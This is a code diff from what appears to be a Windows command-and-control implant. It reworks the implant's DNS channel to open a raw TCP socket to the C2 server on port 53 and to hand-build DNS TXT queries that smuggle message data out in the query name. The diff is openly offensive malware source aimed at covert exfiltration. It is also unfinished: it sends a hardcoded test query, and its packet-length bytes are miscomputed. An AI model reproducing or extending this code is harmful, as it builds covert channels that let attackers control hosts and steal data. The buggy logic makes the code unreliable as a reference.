@@ -29,7 +29,7 @@
 #include <windns.h>
 #include <processthreadsapi.h>
 
-#pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "Ws2_32.lib")
 #pragma comment(lib, "Shlwapi.lib")
 #pragma comment(lib, "Advapi32.lib")
 #pragma comment(lib, "Pathcch.lib")
@@ -76,7 +76,8 @@ HINTERNET hSession       = NULL;
 HINTERNET hConnect       = NULL;
 HINTERNET hRequest       = NULL;
 // DNS
-PIP4_ARRAY pSrvList      = NULL;
+WSADATA wsaData          = {0};
+SOCKET dnsSocket         = {0};
 // Crypto
 BCRYPT_ALG_HANDLE hCrypt = NULL;
 BCRYPT_KEY_HANDLE hKey   = NULL;
@@ -123,22 +124,36 @@ int SetupComms() {
 }
 
 
-// Sets up server list so we can make repeated DNS queries without recreating the list every time.
+// Sets TCP socket so we can make our own DNS packets
 int SetupDNS() {
-    int numerical_ip = 0;
+    struct sockaddr_in serverAddr;
+    int status;
 
-    pSrvList = (PIP4_ARRAY) Malloc(32); // 32 bytes should be enough...hopefully
-    if (pSrvList == NULL) {
-        c2_log("[!] SetupDNS:Malloc failed\n");
+    // Start WinSock2
+    status = WSAStartup(MAKEWORD(2,2), &wsaData);
+    if (status != 0) {
+        c2_log("[!] SetupDNS:WSAStartup failed with status %d\n", status);
         return -1;
     }
 
-    pSrvList->AddrCount = 1;
-    if (InetPtonW(AF_INET, C2_IP, &numerical_ip) != 1) {
-        c2_log("[!] SetupDNS:InetPtonW failed\n");
+    // Create socket
+    dnsSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (dnsSocket == INVALID_SOCKET) {
+        c2_log("[!] SetupDNS:socket failed with status %d\n", status);
         return -1;
     }
-    pSrvList->AddrArray[0] = numerical_ip;
+
+    // Setup target IP
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_port = htons(53);
+    InetPtonW(AF_INET, C2_IP, &serverAddr.sin_addr.s_addr);
+
+    status = connect(dnsSocket, (struct sockaddr*) &serverAddr, sizeof(serverAddr));
+    if (status == SOCKET_ERROR) {
+        c2_log("[!] SetupDNS:connect failed with status %d\n", status);
+        return -1;
+    }
+
     return 0;
 }
 
@@ -197,7 +212,10 @@ int SetupCrypto() {
 
 // Cleans up handles
 void TearDownComms() {
-    if (pSrvList)   {Free(pSrvList);}
+    if (dnsSocket)  {
+        closesocket(dnsSocket);
+        WSACleanup();
+    }
     if (hKey)       {BCryptDestroyKey(hKey);}
     if (hCrypt)     {BCryptCloseAlgorithmProvider(hCrypt, 0);}
     if (hRequest)   {WinHttpCloseHandle(hRequest);}
@@ -477,37 +495,40 @@ int c2_send(char* data, int len) {
 // TODO: encrypt and base64 encode
 // Note: looks like name can be ~60 bytes (found from testing)
 int c2_send2(char* msg, int len) {
-    DNS_STATUS status;
-    DNS_QUERY_REQUEST request  = {0};
-    PDNS_RECORD result         = NULL;
+    
+    srand(time(NULL));
 
-    int num_sent = 0;
-    char buffer[128] = {0};
-    while (num_sent < len) {
-        // Copy chunk of message to buffer which we'll use as domain name to query
-        int bytes_left = len - num_sent;
-        int amount_to_copy = (bytes_left < 60) ? bytes_left : 60;
-        memset(buffer, 0, 128);
-        strncpy(buffer, msg + num_sent, amount_to_copy);
-        strcat(buffer, ".com"); // domain names need a top-level domain
+    //                    Len     TID     Flags   Num.Q   Num R,Auth,Add----------BEGIN name
+    char template[512] = "\xFF\xFF\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06"; // 15 long
 
-        // Send query
-        status = DnsQuery_A(buffer, DNS_TYPE_TEXT, DNS_QUERY_BYPASS_CACHE | DNS_QUERY_USE_TCP_ONLY, pSrvList, &result, NULL);
-        if (status != ERROR_SUCCESS && status != DNS_INFO_NO_RECORDS) {
-            c2_log("[!] c2_send2:DnsQuery_A failed with status %d\n", status);
-            return 0;
-        }
+    // DNS packet length
+    short totalLen = 24 + len;
+    template[0] = totalLen & 0xFF00;
+    template[1] = totalLen & 0x00FF;
 
-        // Get response
-        DNS_RECORD record = result[0];
-        c2_log("Name: %s\nData: %s\n", record.pName, record.Data.TXT.pStringArray[0]);
-        
-        num_sent += amount_to_copy;
+    // Queries
+    memcpy(template + 15, msg, len);
+    template[15 + len] = '\x03';
+    memcpy(template + 16 + len, "com", 3);
+    template[19 + len] = '\x00'; // need null byte at end of name
+
+    // Query type (TXT)
+    template[20 + len] = '\x00';
+    template[21 + len] = '\x10'; 
+
+    // Query class (IN)
+    template[22 + len] = '\x00';
+    template[23 + len] = '\x01';
+
+    char* buffer = "\x00\x1c\x31\xde\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06google\x03com\x00\x00\x10\x00\x01";
+    int n = send(dnsSocket, buffer, 28, 0);// TODO
+    if (n > 0) {
+        c2_log("[+] send success\n");
     }
-
-    c2_log("[+] DNS query success");
-    DnsRecordListFree(result, DnsFreeRecordList);
-    return num_sent;
+    else {
+        c2_log("[!] send fail\n");
+    }
+    return n;
 }
 
 #endif
